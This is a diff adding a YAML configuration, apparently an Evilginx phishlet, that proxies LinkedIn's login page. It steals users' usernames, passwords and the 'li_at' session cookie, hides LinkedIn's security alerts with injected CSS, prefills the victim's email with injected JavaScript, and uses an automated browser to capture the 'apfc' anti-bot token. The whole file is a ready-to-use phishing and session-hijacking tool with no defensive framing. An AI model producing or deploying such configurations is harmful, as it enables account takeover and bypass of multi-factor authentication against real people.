@@ -1,0 +1,63 @@
+name: 'Linkedin'
+min_ver: '3.0.0'
+author: 'www.SimplerHacking.com'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'www.linkedin.com', orig_sub: '', domain: 'www.linkedin.com', search: '<\/head>', replace: '<style>#artdeco-global-alert-container {display: none !important;} .alternate-signin-container {display: none !important;}</style></head>', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.www.linkedin.com'
+    keys: ['li_at']
+credentials:
+  username:
+    key: 'session_key'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'session_password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.linkedin.com'
+  path: '/login'
+js_inject:
+  - trigger_domains: ["www.linkedin.com"]
+    trigger_paths: ["/login"]
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+        var email = document.querySelector("#username");
+        var password = document.querySelector("#password");
+        if (email != null && password != null) {
+          email.value = "{email}";
+          password.focus();
+          return;
+        }
+        setTimeout(function(){lp();}, 100);
+      }
+      setTimeout(function(){lp();}, 100);
+evilpuppet:
+  triggers:
+    - domains: ['www.linkedin.com']
+      paths: ['/checkpoint/lg/login-submit']
+      token: 'apfc'
+      open_url: 'https://www.linkedin.com/login'
+      actions:
+        - selector: '#username'
+          value: '{username}'
+          enter: false
+          click: false
+          post_wait: 500
+        - selector: '#password'
+          value: '{password}'
+          enter: false
+          click: false
+          post_wait: 500
+        - selector: 'button[type=submit]'
+          click: true
+          post_wait: 1000
+  interceptors:
+    - token: 'apfc'
+      url_re: '/checkpoint/lg/login-submit'
+      post_re: 'apfc=([^&]*)'
+      abort: true
